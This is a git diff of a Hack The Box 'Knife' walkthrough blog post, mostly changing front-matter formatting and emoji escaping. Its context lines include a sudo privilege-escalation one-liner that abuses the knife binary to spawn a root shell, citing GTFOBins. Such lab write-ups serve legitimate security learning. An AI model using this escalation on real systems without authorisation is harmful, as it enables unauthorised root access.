@@ -1,24 +1,26 @@
 ---
-date: 2021-08-28 12:00:00
-images: 
-- https://i.imgur.com/U5A7c9y.png
+title: 'Walktrough: HTB Knife'
 language: en-US
 localeid: htb-knife
+date: 2021-08-28T12:00:00.000Z
 tags:
-- HackTheBox
-- HTB Easy
-- HTB Linux
-- Walktrough
-title: 'Walktrough: HTB Knife'
-authors: ['default']
+  - HackTheBox
+  - HTB Easy
+  - HTB Linux
+  - Walktrough
+summary: ''
+images:
+  - 'https://i.imgur.com/U5A7c9y.png'
+authors:
+  - default
 ---
 
 Hello guys!
 
 This week's machine will be **Knife**, another easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [MrKN16H](https://app.hackthebox.eu/users/98767).
 
-:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
-[info]
+\:information\_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
+\[info]
 
 ![HTB Knife](https://i.imgur.com/3IO9vBj.png)
 
@@ -102,7 +104,7 @@ User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife              
 ```
 
-Doing a quick search on this binary, found out that it's related to [Chef's Configuration Management Solution](https://www.chef.io/) and, according to [knife \| GTFOBins](https://gtfobins.github.io/gtfobins/knife/#sudo) page, could be easily used to privesc to root, as below, allowing us to get the final flag :smiley:
+Doing a quick search on this binary, found out that it's related to [Chef's Configuration Management Solution](https://www.chef.io/) and, according to [knife | GTFOBins](https://gtfobins.github.io/gtfobins/knife/#sudo) page, could be easily used to privesc to root, as below, allowing us to get the final flag \:smiley:
 
 ```bash
 james@knife:~$ sudo /usr/bin/knife --help                                                                                 Chef Infra Client: 16.10.8
@@ -119,4 +121,4 @@ james@knife:~$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
 
 I hope you guys have enjoyed!
 
-See you at the next post :smile:
+See you at the next post \:smile:
